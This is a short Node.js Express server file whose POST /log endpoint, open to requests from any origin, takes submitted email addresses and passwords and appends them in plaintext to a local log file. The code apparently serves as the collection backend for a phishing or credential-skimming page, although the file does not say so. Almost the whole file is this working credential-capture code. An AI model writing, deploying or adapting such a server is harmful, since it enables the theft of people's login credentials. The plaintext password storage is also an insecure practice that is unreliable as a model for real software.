import express from 'express';
import fs from 'fs';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(cors()); 
app.use(express.json());

const LOG_FILE = path.join(__dirname, 'activity_log.txt');

app.post('/log', (req, res) => {
    const { email, password, timestamp } = req.body;
    const logEntry = `[${timestamp || new Date().toISOString()}] USER: ${email} | PASS: ${password}\n`;
    
    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error('Failed to write to log:', err);
            return res.status(500).send('Error saving data');
        }
        console.log(`Successfully logged: ${email}`);
        res.send('Logged');
    });
});

app.listen(5000, () => {
    console.log('-----------------------------------------');
    console.log('Log server running on http://localhost:5000');
    console.log('Mode: ES Modules (import/export)');
    console.log('-----------------------------------------');
});
